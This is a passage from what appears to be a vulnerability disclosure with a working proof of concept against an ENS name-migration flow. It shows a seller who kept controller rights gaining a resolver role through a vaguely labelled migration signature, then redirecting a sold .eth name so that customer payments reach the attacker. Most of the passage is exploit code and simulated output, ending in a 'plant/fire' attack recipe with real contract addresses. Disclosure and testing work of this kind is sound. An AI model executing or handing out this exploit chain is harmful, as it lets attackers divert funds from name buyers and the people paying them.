act('ACT 7', 'The attacker redirects the name')
await chain.send({ from: ATTACKER, to: registry, abi: R, fn: 'setResolver', args: [grant.resource, attackerResolver] })
await chain.send({ from: ATTACKER, to: attackerResolver, abi: RES, fn: 'setAddr', args: [grant.resource, ATTACKER] })
say('  ATTACKER.setResolver(...)  -> SUCCEEDS (reverted in ACT 4)')
say('  ATTACKER.setAddr(...)      -> foo.eth points at the attacker')
say()
kv('registry owner of the name', `${await chain.call({ to: registry, abi: R, fn: 'ownerOf', args: [grant.resource] })}   <- still the VICTIM`)

act('ACT 8', 'Customers keep paying foo.eth. The attacker collects.')
const vBefore = await chain.balance(VICTIM)
const aBefore = await chain.balance(ATTACKER)
say('    payment            resolved to                                  who')
say(`    ${'-'.repeat(70)}`)
let stolen = 0n
for (const amt of [3n * ONE, 7n * ONE, 12n * ONE]) {
  const to = await chain.send({ from: CUSTOMER, to: router, abi: c.PaymentRouter.abi,
    fn: 'payToName', args: [grant.resource], value: amt })
  const who = to.toLowerCase() === ATTACKER.toLowerCase() ? 'ATTACKER' : 'victim'
  if (who === 'ATTACKER') stolen += amt
  say(`    ${formatEther(amt).padStart(6)} ETH        ${to}   ${who}`)
}
const vAfter = await chain.balance(VICTIM)
const aAfter = await chain.balance(ATTACKER)
say()
rule('-')
say('  LEDGER (real account balances, read from the EVM state trie)')
rule('-')
say('    account     before ACT 8        after ACT 8         delta')
say(`    VICTIM    ${eth(vBefore)}   ${eth(vAfter)}   ${eth(vAfter - vBefore)}`)
say(`    ATTACKER  ${eth(aBefore)}   ${eth(aAfter)}   ${eth(aAfter - aBefore)}`)
rule('-')
if (aAfter - aBefore !== stolen) throw new Error('ledger mismatch')
if (vAfter !== vBefore) throw new Error('victim balance moved')
say()
say(`  >> ${formatEther(stolen)} ETH intended for foo.eth was collected by the seller.`)
say('  >> The victim received nothing and still owns the name.')
say()
say('  PoC PASSED, every assertion held.')
say()
```

### Output

```
  ACT 1  The real Manager code decides who gets a role on the new name
==============================================================================
  ATTACKER registered foo.eth and was registrant AND controller (the normal
  state of a name), then sold the ERC-721 to VICTIM. The transfer did not
  touch the ENS Registry, so ATTACKER is still the controller.

  classifyNames.ts:162-167 lifted the controller into managerAddress:
    managerAddress             0x00000000000000000000000000000000000000A7

  buildRoleGrantCalls.ts:16-24 emitted the call the victim signs:
    to                         0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
                               (= V2_CONTRACTS.ETHRegistry, the real Sepolia address)
    function                   grantRoles(uint256,uint256,address)
    resource                   0x41b1a0649752af1b28b3dc29a1556eee781e4a4c3a1f7f53f90fa83400000000
    roles                      0x1000000  (= 1 << 24 = ROLE_SET_RESOLVER)
    grantee                    0x00000000000000000000000000000000000000A7

  >> The grantee is the SELLER, the only recipient in the whole migration
     not derived from the connected wallet.

  NEGATIVE CONTROL, the same pipeline on a self-managed name:
    managerAddress -> null, buildRoleGrantCall throws, no grant exists.

==============================================================================
  ACT 2  What the victim is shown before signing
==============================================================================
  The complete copy for this step, read from messages.po:

      "Approve manager restoration"
      "Approve manager restoration in your wallet"
      "Restore the existing managers for your names."

  No address, no name, no mention of a resolver. The address about to
  receive authority is 0x00000000000000000000000000000000000000A7, never shown.

==============================================================================
  ACT 3  On a real EVM: the name is migrated and works correctly
==============================================================================
  compiled Model.sol with solc 0.8.28, booted @ethereumjs/evm
    ETHRegistry (model)        0x6b62d49710a12b869d5f9285725918ddfab3016a
    PaymentRouter              0x60d43587e696ede8c25d816a0cd23dbc3a519ed2

  migration minted the v2 name to VICTIM (Data.owner = victim, ROLES_ALL).
  At this instant the v1 controller has been wiped by the protocol.
  VICTIM pointed foo.eth at their own address.

==============================================================================
  ACT 4  CONTROL: before the grant, the attacker cannot touch the name
==============================================================================
  ATTACKER calls ETHRegistry.setResolver(resource, attackerResolver)
  -> REVERTED: Unauthorized(0x41b1a064...00000000, 0x...A7, 0x1000000)

  Post-migration the seller has NO authority. Whatever happens next is
  created by the migration batch, not inherited from v1.

==============================================================================
  ACT 5  A customer pays foo.eth, money reaches the victim
==============================================================================
  CUSTOMER sends 5 ETH to foo.eth -> resolved to 0x...B0
  VICTIM balance        100 ETH ->        105 ETH

==============================================================================
  ACT 6  The victim signs the batch. The real calldata is executed.
==============================================================================
    real target                0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2   (Sepolia ETHRegistry)
    this EVM                   0x6b62d49710a12b869d5f9285725918ddfab3016a   (the model at ACT 3)
    calldata                   0x7c30058641b1a0649752af1b28b3dc29...  (identical, 100 bytes)

    hasRoles(resource, 1<<24, ATTACKER) true

  >> The seller now holds ROLE_SET_RESOLVER on the buyer's new name.

==============================================================================
  ACT 7  The attacker redirects the name
==============================================================================
  ATTACKER.setResolver(...)  -> SUCCEEDS (reverted in ACT 4)
  ATTACKER.setAddr(...)      -> foo.eth points at the attacker

    registry owner of the name 0x00000000000000000000000000000000000000B0   <- still the VICTIM

==============================================================================
  ACT 8  Customers keep paying foo.eth. The attacker collects.
==============================================================================
    payment            resolved to                                  who
    ----------------------------------------------------------------------
         3 ETH        0x00000000000000000000000000000000000000A7   ATTACKER
         7 ETH        0x00000000000000000000000000000000000000A7   ATTACKER
        12 ETH        0x00000000000000000000000000000000000000A7   ATTACKER

------------------------------------------------------------------------------
  LEDGER (real account balances, read from the EVM state trie)
------------------------------------------------------------------------------
    account     before ACT 8        after ACT 8         delta
    VICTIM           105 ETH          105 ETH            0 ETH
    ATTACKER         100 ETH          122 ETH           22 ETH
------------------------------------------------------------------------------

  >> 22 ETH intended for foo.eth was collected by the seller.
  >> The victim received nothing and still owns the name.

  PoC PASSED, every assertion held.
```

22 ETH sent to the victim's name landed in the attacker's account. The victim still owns the name and received nothing. Exit code is 0 only if every assertion held.

## Attack code

```solidity
// 1. Normal name ownership. Attacker is registrant and controller.
baseRegistrar.register(labelhash("foo"), attacker, duration);
ensRegistry.setOwner(namehash("foo.eth"), attacker);

// 2. Sell it. The ERC-721 moves, the ENS Registry does not.
//    Buyer is now registrant, attacker is still controller.
baseRegistrar.safeTransferFrom(attacker, victim, uint256(labelhash("foo")));
```

```
// 3. Victim migrates in the Manager and signs ONE transaction shown as
//    "Restore the existing managers for your names."
//
//    Inside that batch, built by buildRoleGrantCalls.ts:16-24:
      ETHRegistry.grantRoles(
          labelToCanonicalId("foo"),   // the victim's brand new v2 name
          1 << 24,                     // ROLE_SET_RESOLVER
          attacker                     // the seller, straight from the subgraph
      )
```

```solidity
// 4. Any time later. No ownership needed, the role is the whole gate.
ETHRegistry.setResolver(labelToCanonicalId("foo"), attackerResolver);
attackerResolver.setAddr(labelToCanonicalId("foo"), attacker);

// 5. Every payment to foo.eth now resolves to the attacker.
```

```
plant : sell any .eth name without the buyer calling reclaim()   // the default outcome of a sale
fire  : ETHRegistry.setResolver(labelToCanonicalId(label), attackerResolver)
```
